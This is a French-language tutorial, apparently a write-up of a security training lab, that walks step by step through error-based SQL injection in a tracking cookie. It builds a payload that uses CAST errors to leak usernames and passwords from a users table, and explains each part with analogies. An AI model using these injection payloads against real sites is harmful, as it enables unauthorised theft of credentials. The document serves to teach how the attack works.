
# 1️⃣ La requête normale du site

Le site exécute quelque chose comme :

SELECT * FROM tracking WHERE id = 'TrackingId'

Si ton cookie vaut :

abc123

la requête devient :

SELECT * FROM tracking WHERE id = 'abc123'

La base vérifie simplement si ce tracking id existe.

---

# Analogie

Imagine un classeur avec des colis :

|id|info|
|---|---|
|abc123|colis1|
|def456|colis2|

La requête dit :

> donne moi le colis dont l’id est **abc123**

---

# 2️⃣ Tu ajoutes une apostrophe `'`

Payload :

'

La requête devient :

SELECT * FROM tracking WHERE id = '''

La base voit :

- `'` ouvre une chaîne
    
- `'` ferme la chaîne
    
- `'` ouvre encore une chaîne mais elle n’est jamais fermée
    

Donc erreur :

Unterminated string literal

---

# Analogie

Imagine cette phrase :

> Je m'appelle "Ilyass

Le guillemet est ouvert mais jamais fermé.

La phrase est **grammaticalement cassée**.

---

# 3️⃣ On corrige avec un commentaire `--`

Payload :

'-- 

La requête devient :

SELECT * FROM tracking WHERE id = ''-- '

Tout ce qui est après `--` est ignoré.

Donc la base lit seulement :

SELECT * FROM tracking WHERE id = ''

Requête valide.

---

# Analogie

Tu écris :

> Je vais au marché acheter des pommes // ignore le reste

Le commentaire coupe la phrase.

---

# 4️⃣ On ajoute une condition

Payload :

' AND CAST((SELECT 1) AS int)-- 

La requête devient :

SELECT * FROM tracking WHERE id = '' AND CAST((SELECT 1) AS int)

---

# Ce que SQL essaie de comprendre

`WHERE` attend une condition comme :

prix = 10  
age > 18  
1 = 1

Mais ici il voit :

CAST((SELECT 1) AS int)

qui renvoie **1**.

Donc SQL dit :

> je ne peux pas faire `AND 1`, j’ai besoin d’une condition vraie ou fausse.

---

# Analogie

Si je te dis :

> la porte est fermée ET 1

ça ne veut rien dire.

Il faut dire :

> la porte est fermée ET **1 = 1**

---

# 5️⃣ On transforme en condition logique

Payload :

' AND 1=CAST((SELECT 1) AS int)-- 

La requête devient :

SELECT * FROM tracking WHERE id = '' AND 1=CAST((SELECT 1) AS int)

---

# Ce que SQL calcule

SELECT 1

renvoie :

1

Puis :

CAST(1 AS int)

renvoie :

1

Donc SQL évalue :

1 = 1

Condition **vraie**.

La requête fonctionne.

---

# Analogie

Tu demandes :

> est-ce que 1 = 1 ?

La réponse est **oui**.

Donc la condition passe.

---

# 6️⃣ Maintenant on lit une vraie donnée

Payload :

' AND 1=CAST((SELECT username FROM users) AS int)-- 

La sous-requête :

SELECT username FROM users

retourne par exemple :

administrator  
carlos  
john

---

# Pourquoi ça plante

SQL essaye :

CAST('administrator' AS int)

Mais **administrator n’est pas un nombre**.

Donc erreur :

invalid input syntax for type integer: "administrator"

---

# Ce qui est génial

Le message d’erreur affiche :

administrator

Donc tu viens **d’extraire une donnée de la base**.

---

# Analogie

Tu demandes à quelqu’un :

> transforme "administrator" en nombre

Il répond :

> erreur : "administrator" n’est pas un nombre

En se plaignant, il vient de **te révéler le mot**.

---

# 7️⃣ Pourquoi on met `LIMIT 1`

Sans ça, SQL voit plusieurs résultats :

administrator  
carlos  
john

Et dit :

subquery returned multiple rows

Donc on dit :

LIMIT 1

pour récupérer seulement :

administrator

---

# Analogie

Tu demandes :

> donne-moi le prénom des élèves

Mais il y a 30 élèves.

La personne dit :

> il y en a trop.

Donc tu dis :

> donne-moi **le premier prénom seulement**.

---

# 8️⃣ On récupère le password

Payload final :

' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)-- 

La sous-requête retourne :

k9x8p2m

Puis SQL fait :

CAST('k9x8p2m' AS int)

Impossible.

Erreur :

invalid input syntax for type integer: "k9x8p2m"

---

# Résultat

Le message d’erreur contient :

"k9x8p2m"

➡️ c’est **le mot de passe**.

Tu peux maintenant te connecter.

---

# Décomposition du payload final

' 

ferme la chaîne SQL.

---

AND

ajoute une condition.

---

1=

transforme l’expression en test logique.

---

CAST((SELECT password FROM users LIMIT 1) AS int)

force une erreur qui affiche le password.

---

--

commente le reste.

---

# L’idée centrale du lab

Tu ne demandes pas :

> donne-moi le mot de passe

Tu demandes :

> essaie de transformer le mot de passe en nombre

Et la base répond :

> erreur : "password123" n’est pas un nombre

Donc **elle révèle le secret**.

---

# La logique à retenir pour toujours

Quand tu vois :

SQL error visible

pense immédiatement :

CAST((SELECT data) AS int)

Parce que :

- le `SELECT` récupère la donnée
    
- `CAST` provoque l’erreur
    
- l’erreur affiche la donnée
